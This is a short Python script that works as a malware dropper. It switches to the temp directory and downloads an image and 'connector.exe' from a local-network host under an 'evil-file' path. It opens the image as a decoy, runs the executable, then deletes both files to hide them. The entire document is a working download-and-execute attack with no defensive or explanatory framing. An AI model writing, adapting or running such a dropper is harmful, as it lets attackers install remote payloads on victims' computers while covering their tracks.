import requests, subprocess, os, tempfile


temp_file = tempfile.gettempdir()
print(temp_file)
os.chdir(temp_file)

def download(url):
    data_request = requests.get(url=url)
    name_file = url.split("/")[-1]
    with open(name_file, "bw") as file:
        file.write(data_request.content)


download("http://192.168.67.128/evil-file/ss.png")
subprocess.Popen("ss.png", shell=True)


download("http://192.168.67.128/evil-file/connector.exe")
subprocess.call("connector.exe", shell=True)

os.remove("ss.png")
os.remove("connector.exe")